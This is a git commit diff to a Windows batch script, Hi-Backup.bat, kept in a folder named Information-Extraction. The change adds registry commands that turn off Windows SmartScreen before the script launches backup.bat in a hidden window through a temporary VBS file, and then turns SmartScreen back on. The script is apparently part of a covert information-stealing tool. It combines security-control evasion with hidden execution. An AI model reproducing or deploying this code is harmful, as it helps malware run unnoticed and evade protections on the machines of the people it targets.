3fc583e7af65b4621164f33594d28c9d3c24f35e
Yextep <114537444+Yextep@users.noreply.github.com>
2023-10-24 15:43:45 -0500

    Update Hi-Backup.bat

--- Information-Extraction/Backup/Hi-Backup.bat
+++ Information-Extraction/Backup/Hi-Backup.bat
@@ -1,9 +1,17 @@
 @echo off
 SetLocal
+
+:: Deshabilitar SmartScreen
+reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SmartScreen" /v "EnableSmartScreen" /t REG_SZ /d "0" /f
+
 set VBSFile=%temp%\invisible.vbs
 (
 echo Set objShell = CreateObject("WScript.Shell"^)
 echo objShell.Run "backup.bat", 0, False
 )>%VBSFile%
 cscript //nologo %VBSFile%
+
+:: Habilitar SmartScreen nuevamente
+reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SmartScreen" /v "EnableSmartScreen" /t REG_SZ /d "1" /f
+
 EndLocal
